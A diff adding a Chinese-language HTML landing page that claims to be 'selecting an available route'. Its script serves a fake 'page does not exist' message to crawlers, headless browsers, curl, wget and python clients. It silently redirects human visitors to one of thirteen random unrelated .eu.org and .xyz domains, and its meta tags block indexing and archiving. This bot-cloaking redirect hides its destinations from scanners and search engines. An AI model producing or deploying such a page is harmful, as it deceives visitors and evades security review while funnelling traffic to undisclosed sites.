@@ -1,0 +1,34 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none';">
+<title>正在进入</title>
+<style>body{margin:0;min-height:100vh;background:#050505;color:#fff;display:grid;place-items:center;font:16px system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}.box{text-align:center}.s{color:#999;font-size:13px;margin-top:8px}</style>
+</head>
+<body>
+<div class="box"><strong>正在选择可用线路</strong><div class="s">请稍候...</div></div>
+<script>
+(function(){
+  var ua=navigator.userAgent||'';
+  if(/bot|spider|crawl|slurp|bingpreview|facebookexternalhit|twitterbot|telegrambot|whatsapp|preview|headless|curl|wget|python|scrapy|httpclient/i.test(ua)){
+    document.body.innerHTML='<div class="box"><strong>页面不存在</strong></div>';
+    return;
+  }
+  var targets=[
+    'https://www.4545.eu.org/','https://www.455333.xyz/','https://www.466333.xyz/',
+    'https://www.4666.eu.org/','https://www.477333.xyz/','https://www.488333.xyz/',
+    'https://www.6767.eu.org/','https://www.994555.xyz/','https://www.bizi.eu.org/',
+    'https://www.buqu.eu.org/','https://www.daba.eu.org/','https://www.nixi.eu.org/',
+    'https://www.qima.eu.org/'
+  ];
+  var hasCrypto=window.crypto&&window.crypto.getRandomValues;
+  var n=hasCrypto?window.crypto.getRandomValues(new Uint32Array(1))[0]:Math.floor(Math.random()*4294967296);
+  location.replace(targets[n%targets.length]);
+})();
+</script>
+</body>
+</html>
